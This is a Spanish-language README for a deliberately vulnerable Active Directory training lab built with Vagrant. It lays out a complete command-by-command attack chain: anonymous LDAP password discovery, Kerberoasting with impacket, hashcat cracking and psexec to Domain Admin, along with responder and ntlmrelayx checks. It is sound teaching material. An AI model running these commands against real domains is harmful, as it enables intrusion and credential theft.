# Lab AD - Single Attack Path

Laboratorio de Active Directory para práctica de pentesting. Construido con Vagrant sobre VirtualBox.

Dominio: `corp.local` — DC Windows Server 2019 + Workstation Windows 10.

---

## Decisión de diseño: una sola ruta de explotación

La mayoría de labs AD tienen múltiples vulnerabilidades sin jerarquía. Eso dificulta aprender a fondo una técnica antes de pasar a la siguiente.

Este lab tiene **10 vectores bloqueados deliberadamente** y **uno abierto**. El objetivo es entender cómo funciona Kerberoasting en un entorno con defensa real, no en uno que simplemente dejó todo abierto.

### Qué está bloqueado y por qué

| Vector | Medida aplicada | Efecto |
|--------|----------------|--------|
| AS-REP Roasting | Pre-auth Kerberos obligatorio | KDC no entrega TGT sin autenticación |
| Brute force | Lockout tras 5 intentos / 30 min | Fuerza bruta impracticable |
| NTLM Relay | SMB signing requerido | Paquetes modificados son rechazados |
| LLMNR Poisoning | LLMNR deshabilitado | Sin broadcasts para envenenar |
| NBT-NS Poisoning | NetBIOS deshabilitado | Sin broadcasts para envenenar |
| EternalBlue | SMBv1 deshabilitado | Protocolo vulnerable no disponible |
| PrintNightmare | Print Spooler deshabilitado | Servicio no corre |
| Credential dump | WDigest off + LSA PPL | Sin creds en texto plano en LSASS |
| Delegation abuse | Delegation deshabilitada en todas las cuentas | S4U no funciona |

### Por qué LDAP anónimo funciona con SMB hardenizado

LDAP (puerto 389) y SMB (puerto 445) son protocolos independientes. SMB signing no afecta LDAP. `dsHeuristics="0000002"` habilita operaciones LDAP anónimas sin tocar SMB — esta es la separación de capas que el hardening estándar suele ignorar.

---

## Topología

```
192.168.56.0/24
    ├── .10   Kali   (atacante, autostart: false)
    ├── .100  DC01   (Windows Server 2019 - Domain Controller)
    └── .101  WS01   (Windows 10 - Workstation)
```

---

## Attack chain

```
1. ldapsearch anónimo
   └── Description de j.smith contiene: "Temp password: Welcome1"

2. Autenticarse como j.smith
   └── crackmapexec smb ... -u j.smith -p Welcome1

3. Kerberoasting
   └── impacket-GetUserSPNs -> hash TGS de svc_backup (tiene SPN registrado)

4. Crack offline
   └── hashcat -m 13100 + rockyou.txt -> Password1

5. svc_backup es Domain Admin
   └── impacket-psexec -> SYSTEM en DC -> flags
```

---

## Uso

### Requisito previo

```bash
vagrant plugin install vagrant-reload
```

### Despliegue

```bash
# Levantar y configurar el DC (instala AD, reinicia, crea usuarios + hardening)
vagrant up dc

# Levantar la workstation
vagrant up ws01

# Unir WS01 al dominio (ejecutar cuando el DC esté listo)
vagrant provision ws01 --provision-with join-domain

# Opcional: levantar Kali (atacante)
vagrant up kali
```

### Verificación del lab

Desde Kali o el host:

```bash
# 1. Confirmar puertos del DC
nmap -sV 192.168.56.100
# Esperado: 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), 636 (LDAPS)

# 2. LDAP anónimo
ldapsearch -x -H ldap://192.168.56.100 \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName description
# Esperado: j.smith con "Temp password: Welcome1" en Description

# 3. Validar creds
crackmapexec smb 192.168.56.100 -u j.smith -p Welcome1

# 4. Kerberoasting
impacket-GetUserSPNs corp.local/j.smith:Welcome1 \
  -dc-ip 192.168.56.100 -request

# 5. Crack
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# 6. Acceso como Domain Admin
impacket-psexec corp.local/svc_backup:Password1@192.168.56.100
```

### Verificar que el hardening funciona

```bash
# AS-REP Roasting -> debe devolver 0 resultados
impacket-GetNPUsers corp.local/ \
  -dc-ip 192.168.56.100 -no-pass -usersfile users.txt

# LLMNR/NBT-NS Poisoning -> sin hashes capturados
responder -I eth1

# NTLM Relay -> SMB signing bloquea
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## Estructura del repositorio

```
lab-ad/
├── Vagrantfile                  # Define las 3 VMs
└── scripts/
    ├── install-ad.ps1           # Fase 1: instala AD DS y promueve a DC
    ├── configure-ad.ps1         # Fase 2: usuarios, LDAP anónimo, hardening, flags
    └── join-domain.ps1          # Une WS01 al dominio (ejecución manual)
```

---

## Notas técnicas

- `vagrant-reload` es necesario para el reboot post-promoción del DC. Sin él, el provisioner `configure-ad` se ejecuta antes de que AD esté disponible.
- `NoRebootOnCompletion` en `Install-ADDSForest` le devuelve el control a Vagrant para que gestione el reboot via plugin.
- `Password1` está confirmado en `rockyou.txt`. El objetivo es que el crack funcione en minutos, no en horas.
- Los boxes de `gusztavvargadr` son los más mantenidos para Windows en Vagrant. El boot puede tardar 10-15 minutos en el primer `vagrant up`.
